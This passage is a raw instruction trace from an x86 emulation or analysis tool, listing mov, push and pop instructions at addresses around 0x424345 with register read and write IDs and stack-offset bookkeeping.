0x24], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fdc for stack size 0x10000 0x424345: mov eax, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 0x424350: mov eax, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 0x42435b: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 0x424366: mov eax, dword ptr [ebp - 0x48], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fb8 for stack size 0x10000 0x424371: mov eax, dword ptr [ebp - 0x5c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 0x42437c: mov eax, dword ptr [ebp - 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff8 for stack size 0x10000 0x424381: mov dword ptr [ebp - 0x50], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x424384: mov ecx, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x8010 for stack size 0x10000 0x424397: mov dword ptr [ebp - 0x78], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f88 for stack size 0x10000 saving data to stack: 0 4 0x42439a: mov dword ptr [ebp - 0x7c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f84 for stack size 0x10000 saving data to stack: 0 4 0x42439d: mov eax, dword ptr [ebp - 0x34], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fcc for stack size 0x10000 0x4243a3: mov dword ptr [ebp - 0x68], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 saving data to stack: 0 4 0x4243a6: mov ecx, edx, regs_read: [24], regs_write: [22] 0x4243a8: mov eax, esi, regs_read: [29], regs_write: [19] 0x4243aa: mov esi, dword ptr [ebp - 0x68], regs_read: [20], regs_write: [29] adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 0x4243b2: mov eax, ebx, regs_read: [21], regs_write: [19] 0x4243bb: mov eax, edi, regs_read: [23], regs_write: [19] 0x4243bd: mov edi, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x800c for stack size 0x10000 0x4243c7: mov eax, dword ptr [ebp - 0x60], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 0x4243d1: mov eax, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 0x4243db: mov eax, dword ptr [ebp - 0x40], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x4243e5: mov eax, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 0x4243ef: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 0x4243f9: mov eax, dword ptr [ebp - 0x3c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fc4 for stack size 0x10000 0x424403: mov eax, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 0x42440b: mov dword ptr [ebp - 0x68], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 saving data to stack: 0 4 0x424421: mov dword ptr [ebp - 0x80], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 4 0x424424: mov eax, dword ptr [ebp - 0x34], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fcc for stack size 0x10000 0x42442a: mov dword ptr [ebp - 0x88], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7f78 for stack size 0x10000 saving data to stack: 0 4 0x424430: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x424433: mov esi, edx, regs_read: [24], regs_write: [29] 0x424435: mov eax, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 0x42443e: mov eax, dword ptr [ebp - 0x40], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x424449: mov eax, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 0x424454: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 0x42445f: mov eax, dword ptr [ebp - 0x3c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fc4 for stack size 0x10000 0x42446a: mov eax, dword ptr [ebp - 0x48], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fb8 for stack size 0x10000 0x424475: mov eax, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 0x424480: mov eax, dword ptr [ebp - 0x5c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 0x42448b: mov eax, dword ptr [ebp - 0x64], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 0x424496: mov eax, dword ptr [ebp - 0x68], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f98 for stack size 0x10000 0x42449e: mov edx, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fdc for stack size 0x10000 0x4244b0: mov dword ptr [ebp - 0x90], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 4 0x4244bf: mov dword ptr [ebp - 0x4c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x4244c2: mov edi, edx, regs_read: [24], regs_write: [23] 0x4244c4: mov edx, dword ptr [ebp - 0x1c], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fe4 for stack size 0x10000 0x4244d2: mov edx, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fec for stack size 0x10000 0x4244e0: mov edx, dword ptr [ebp - 0x38], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fc8 for stack size 0x10000 0x4244e8: mov ebx, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [21] adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 0x4244ef: mov edx, dword ptr [ebp - 0x2c], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fd4 for stack size 0x10000 0x4244fa: mov eax, dword ptr [ebp - 0x70], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x424504: mov eax, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 0x42450e: mov eax, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 0x424518: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 0x424522: mov eax, dword ptr [ebp - 0x48], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fb8 for stack size 0x10000 0x42452c: mov eax, dword ptr [ebp - 4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ffc for stack size 0x10000 0x424537: mov dword ptr [ebp - 0x4c], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x42453c: mov ecx, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [22] adjusting stack for ESP -0xc and offset 0x7fec for stack size 0x10000 0x42454b: mov dword ptr [ebp - 0x98], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f68 for stack size 0x10000 saving data to stack: 0 4 0x42455a: mov ebx, edx, regs_read: [24], regs_write: [21] 0x42455c: mov ecx, eax, regs_read: [19], regs_write: [22] 0x42455e: mov edx, dword ptr [ebp - 0x38], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fc8 for stack size 0x10000 0x42456b: mov edx, dword ptr [ebp - 0x2c], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fd4 for stack size 0x10000 0x424578: mov edx, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fdc for stack size 0x10000 0x424585: mov edx, dword ptr [ebp - 0x1c], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fe4 for stack size 0x10000 0x424590: mov eax, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 0x42459a: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 0x4245a4: mov eax, dword ptr [ebp - 0x48], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fb8 for stack size 0x10000 0x4245ae: mov eax, dword ptr [ebp - 0x5c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 0x4245b8: mov eax, dword ptr [ebp - 0x6c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 0x4245c2: mov eax, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 0x4245cd: mov dword ptr [ebp - 0x9c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f64 for stack size 0x10000 saving data to stack: 0 4 0x4245e1: mov dword ptr [ebp - 0x94], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x4245e7: mov eax, dword ptr [ebp - 0x34], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fcc for stack size 0x10000 0x4245f0: mov ecx, eax, regs_read: [19], regs_write: [22] 0x4245f2: mov esi, edx, regs_read: [24], regs_write: [29] 0x4245f4: mov eax, dword ptr [ebp - 0x70], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x4245fc: mov eax, dword ptr [ebp - 0x60], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 0x424606: mov eax, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 0x424610: mov eax, dword ptr [ebp - 0x40], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 0x42461a: mov eax, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 0x424624: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 0x42462e: mov eax, dword ptr [ebp - 0x3c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fc4 for stack size 0x10000 0x424638: mov eax, dword ptr [ebp - 0x48], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fb8 for stack size 0x10000 0x424642: mov eax, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 0x42464c: mov eax, dword ptr [ebp - 0x9c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f64 for stack size 0x10000 0x42465a: mov dword ptr [ebp - 0x70], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 saving data to stack: 0 4 0x42466b: mov dword ptr [ebp - 0x60], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fa0 for stack size 0x10000 saving data to stack: 0 4 0x42466e: mov eax, dword ptr [ebp - 0x34], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fcc for stack size 0x10000 0x424677: mov edi, eax, regs_read: [19], regs_write: [23] 0x424679: mov ecx, edx, regs_read: [24], regs_write: [22] 0x42467b: mov eax, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 0x424683: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 0x42468d: mov eax, dword ptr [ebp - 0x3c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fc4 for stack size 0x10000 0x424697: mov eax, dword ptr [ebp - 0x48], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fb8 for stack size 0x10000 0x4246a1: mov eax, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 0x4246ab: mov eax, dword ptr [ebp - 0x5c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 0x4246b5: mov eax, dword ptr [ebp - 0x64], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 0x4246bf: mov eax, dword ptr [ebp - 0x6c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 0x4246c9: mov eax, dword ptr [ebp - 0x74], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f8c for stack size 0x10000 0x4246d3: mov eax, dword ptr [ebp - 0x70], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f90 for stack size 0x10000 0x4246db: mov edx, dword ptr [ebp - 0x88], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7f78 for stack size 0x10000 0x4246e3: mov dword ptr [ebp - 0x40], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7fc0 for stack size 0x10000 saving data to stack: 0 4 0x4246e6: mov ebx, dword ptr [ebp - 0x80], regs_read: [20], regs_write: [21] adjusting stack for ESP -0xc and offset 0x7f80 for stack size 0x10000 0x4246ff: mov dword ptr [ebp - 0x54], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0xc and offset 0x7fac for stack size 0x10000 saving data to stack: 0 4 0x424704: mov edx, dword ptr [ebp - 0x38], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fc8 for stack size 0x10000 0x424725: mov dword ptr [ebp - 0x88], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7f78 for stack size 0x10000 saving data to stack: 0 4 0x42472b: mov ebx, eax, regs_read: [19], regs_write: [21] 0x42472d: mov esi, edx, regs_read: [24], regs_write: [29] 0x42472f: mov edx, dword ptr [ebp - 0x2c], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fd4 for stack size 0x10000 0x42473c: mov edx, dword ptr [ebp - 0x24], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fdc for stack size 0x10000 0x424749: mov edx, dword ptr [ebp - 0x1c], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fe4 for stack size 0x10000 0x424756: mov edx, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [24] adjusting stack for ESP -0xc and offset 0x7fec for stack size 0x10000 0x424761: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 0x42476b: mov eax, dword ptr [ebp - 0x48], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fb8 for stack size 0x10000 0x424775: mov eax, dword ptr [ebp - 0x5c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 0x42477f: mov eax, dword ptr [ebp - 0x6c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 0x424789: mov eax, dword ptr [ebp - 0x84], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f7c for stack size 0x10000 0x424796: mov eax, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7ff4 for stack size 0x10000 0x42479d: mov dword ptr [ebp - 0x80], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0xc and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 4 0x4247b2: mov edi, eax, regs_read: [19], regs_write: [23] 0x4247b4: mov ecx, edx, regs_read: [24], regs_write: [22] 0x4247b6: mov eax, dword ptr [ebp - 0x3c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fc4 for stack size 0x10000 0x4247c1: mov eax, dword ptr [ebp - 0x48], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fb8 for stack size 0x10000 0x4247cb: mov eax, dword ptr [ebp - 0x58], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fa8 for stack size 0x10000 0x4247d5: mov eax, dword ptr [ebp - 0x5c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7fa4 for stack size 0x10000 0x4247df: mov eax, dword ptr [ebp - 0x64], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f9c for stack size 0x10000 0x4247e9: mov eax, dword ptr [ebp - 0x6c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f94 for stack size 0x10000 0x4247f3: mov eax, dword ptr [ebp - 0x74], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f8c for stack size 0x10000 0x4247fd: mov eax, dword ptr [ebp - 0x84], regs_read: [20], regs_write: [19] adjusting stack for ESP -0xc and offset 0x7f7c for stack size 0x10000 0x424808: push 0, regs_read: [30], regs_write: [30] 0x42480c: mov eax, dword ptr [ebp - 0x8c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x10 and offset 0x7f74 for stack size 0x10000 0x424812: push 0x13, regs_read: [30], regs_write: [30] 0x42481b: mov eax, dword ptr [ebp - 0x78], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x14 and offset 0x7f88 for stack size 0x10000 0x424824: mov esi, edi, regs_read: [23], regs_write: [29] 0x42483e: push ecx, regs_read: [30, 22], regs_write: [30] 0x42483f: push esi, regs_read: [30, 29], regs_write: [30] 0x424840: mov dword ptr [ebp - 0x78], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x7f88 for stack size 0x10000 saving data to stack: 0 4 0x42484b: mov ecx, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x8010 for stack size 0x10000 0x424853: mov eax, dword ptr [ebp - 8], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7ff8 for stack size 0x10000 0x424858: mov dword ptr [ebp + 0x10], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x1c and offset 0x8010 for stack size 0x10000 saving data to stack: 0 4 0x42485b: mov edx, dword ptr [ebp + 8], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x1c and offset 0x8008 for stack size 0x10000 0x42486b: mov eax, ecx, regs_read: [22], regs_write: [19] 0x424873: mov eax, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x8010 for stack size 0x10000 0x424876: mov dword ptr [edx], eax, regs_read: [24, 19], regs_write: () 0x424878: mov eax, dword ptr [ebp - 0x90], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7f70 for stack size 0x10000 0x424884: mov eax, dword ptr [ebp - 0x68], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7f98 for stack size 0x10000 0x424889: mov ecx, dword ptr [ebp - 0x4c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x7fb4 for stack size 0x10000 0x42488c: mov dword ptr [edx + 4], eax, regs_read: [24, 19], regs_write: () 0x42488f: mov eax, dword ptr [ebp - 0x94], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7f6c for stack size 0x10000 0x42489a: mov eax, dword ptr [ebp - 0x54], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7fac for stack size 0x10000 0x4248a0: mov dword ptr [edx + 8], ecx, regs_read: [24, 22], regs_write: () 0x4248a3: mov ecx, dword ptr [ebp - 0x70], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x7f90 for stack size 0x10000 0x4248a8: mov eax, dword ptr [ebp - 0x50], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7fb0 for stack size 0x10000 0x4248ab: mov dword ptr [edx + 0xc], ecx, regs_read: [24, 22], regs_write: () 0x4248ae: mov ecx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x800c for stack size 0x10000 0x4248be: mov eax, ecx, regs_read: [22], regs_write: [19] 0x4248c6: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x800c for stack size 0x10000 0x4248c9: mov dword ptr [edx + 0x10], eax, regs_read: [24, 19], regs_write: () 0x4248cc: mov eax, dword ptr [ebp - 0x98], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7f68 for stack size 0x10000 0x4248d8: mov eax, dword ptr [ebp - 4], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7ffc for stack size 0x10000 0x4248dd: mov ecx, dword ptr [ebp - 0x9c], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x7f64 for stack size 0x10000 0x4248e3: mov dword ptr [edx + 0x14], eax, regs_read: [24, 19], regs_write: () 0x4248e6: mov eax, dword ptr [ebp - 0x60], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7fa0 for stack size 0x10000 0x4248ee: mov eax, dword ptr [ebp - 0x88], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7f78 for stack size 0x10000 0x4248f4: mov dword ptr [edx + 0x18], ecx, regs_read: [24, 22], regs_write: () 0x4248f7: mov ecx, dword ptr [ebp - 0x40], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x1c and offset 0x7fc0 for stack size 0x10000 0x4248ff: mov dword ptr [edx + 0x1c], ecx, regs_read: [24, 22], regs_write: () 0x424902: mov eax, dword ptr [ebp - 0x80], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x1c and offset 0x7f80 for stack size 0x10000 0x42490f: mov dword ptr [edx + 0x20], eax, regs_read: [24, 19], regs_write: () 0x424912: mov dword ptr [edx + 0x24], edi, regs_read: [24, 23], regs_write: () 0x424915: pop edi, regs_read: [30], regs_write: [30, 23] 0x424916: pop esi, regs_read: [30], regs_write: [30, 29] 0x424917: pop ebx, regs_read: [30], regs_write: [30, 21] 0x424918: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x10 and offset 0x8000 for stack size 0x10000 0x42491a: pop ebp, regs_read: [30], regs_write: [30, 20] 0x424920: push ebp, regs_read: [30, 20], regs_write: [30] 0x424921: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x424926: push ebx, regs_read: [30, 21], regs_write: [30] 0x424927: mov ebx, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x4 and offset 0x800c for stack size 0x10000 0x42492a: push esi, regs_read: [30, 29], regs_write: [30] 0x42492b: mov esi, dword ptr [ebp + 0x10], regs_read: [20], regs_write: [29] adjusting stack for ESP -0x8 and offset 0x8010 for stack size 0x10000 0x42492e: push edi, regs_read: [30, 23], regs_write: [30] 0x42492f: mov eax, dword ptr [ebx + 4], regs_read: [21], regs_write: [19] 0x424932: push 0, regs_read: [30], regs_write: [30] 0x424935: push esi, regs_read: [30, 29], regs_write: [30] 0x424936: push edx, regs_read: [30, 24], regs_write: [30] 0x424937: push eax, regs_read: [30, 19], regs_write: [30] 0x42493d: mov dword ptr [ebp - 0x14], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x1c and offset 0x7fec for stack size 0x10000 saving data to stack: 0 4 0x424940: mov edi, edx, regs_read: [24], regs_write: [23] 0x424942: mov eax, dword ptr [ebx + 0xc], regs_read: [21], regs_write: [19] 0x424945: push 0, regs_read: [30], regs_write: [30] 0x424948: push esi, regs_read: [30, 29], regs_write: [30] 0x424949: push edx, regs_read: [30, 24], regs_write: [30] 0x42494a: push eax, regs_read: [30, 19], regs_write: [30] 0x424950: mov dword ptr [ebp - 0x18], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x2c and offset 0x7fe8 for stack size 0x10000 saving data to stack: 0 4 0x424953: mov eax, dword ptr [ebx + 0x14], regs_read: [21], regs_write: [19] 0x424956: push 0, regs_read: [30], regs_write: [30] 0x424958: mov dword ptr [ebp - 0x24], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x30 and offset 0x7fdc for stack size 0x10000 saving data to stack: 0 4 0x42495c: push esi, regs_read: [30, 29], regs_write: [30] 0x42495d: push edx, regs_read: [30, 24], regs_write: [30] 0x42495e: push eax, regs_read: [30, 19], regs_write: [30] 0x424964: mov dword ptr [ebp - 0x1c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x3c and offset 0x7fe4 for stack size 0x10000 saving data to stack: 0 4 0x424967: mov eax, dword ptr [ebx + 0x1c], regs_read: [21], regs_write: [19] 0x42496a: push 0, regs_read: [30], regs_write: [30] 0x42496c: mov dword ptr [ebp - 0x20], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x40 and offset 0x7fe0 for stack size 0x10000 saving data to stack: 0 4 0x424970: push esi, regs_read: [30, 29], regs_write: [30] 0x424971: push edx, regs_read: [30, 24], regs_write: [30] 0x424972: push eax, regs_read: [30, 19], regs_write: [30] 0x424978: mov dword ptr [ebp - 0x28], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x4c and offset 0x7fd8 for stack size 0x10000 saving data to stack: 0 4 0x42497b: mov eax, dword ptr [ebx + 0x24], regs_read: [21], regs_write: [19] 0x42497e: push 0, regs_read: [30], regs_write: [30] 0x424980: mov dword ptr [ebp - 0x10], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x50 and offset 0x7ff0 for stack size 0x10000 saving data to stack: 0 4 0x424984: push esi, regs_read: [30, 29], regs_write: [30] 0x424985: push edx, regs_read: [30, 24], regs_write: [30] 0x424986: push eax, regs_read: [30, 19], regs_write: [30] 0x42498c: mov dword ptr [ebp - 0x48], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x5c and offset 0x7fb8 for stack size 0x10000 saving data to stack: 0 4 0x42498f: mov esi, edx, regs_read: [24], regs_write: [29] 0x424996: push 0, regs_read: [30], regs_write: [30] 0x424998: push dword ptr [ebp + 0x10], regs_read: [30, 20], regs_write: [30] 0x4249a2: mov dword ptr [ebp - 0x2c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x64 and offset 0x7fd4 for stack size 0x10000 saving data to stack: 0 4 0x4249a5: mov eax, dword ptr [ebx], regs_read: [21], regs_write: [19] 0x4249a8: push edx, regs_read: [30, 24], regs_write: [30] 0x4249a9: push eax, regs_read: [30, 19], regs_write: [30] 0x4249b2: push 0, regs_read: [30], regs_write: [30] 0x4249b4: push 0x13, regs_read: [30], regs_write: [30] 0x4249b6: push esi, regs_read: [30, 29], regs_write: [30] 0x4249b7: push dword ptr [ebp - 0x2c], regs_read: [30, 20], regs_write: [30] 0x4249ba: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x7c and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x4249bd: mov ebx, edx, regs_read: [24], regs_write: [21] 0x4249c7: mov eax, dword ptr [ebp + 0xc], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x7c and offset 0x800c for stack size 0x10000 0x4249cc: mov dword ptr [ebp - 0x30], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP -0x7c and offset 0x7fd0 for stack size 0x10000 saving data to stack: 0 4 0x4249cf: mov ebx, dword ptr [ebp - 0x14], regs_read: [20], regs_write: [21] adjusting stack for ESP -0x7c and offset 0x7fec for stack size 0x10000 0x4249d2: mov eax, dword ptr [eax + 8], regs_read: [19], regs_write: [19] 0x4249e3: mov dword ptr [ebp - 0x34], ebx, 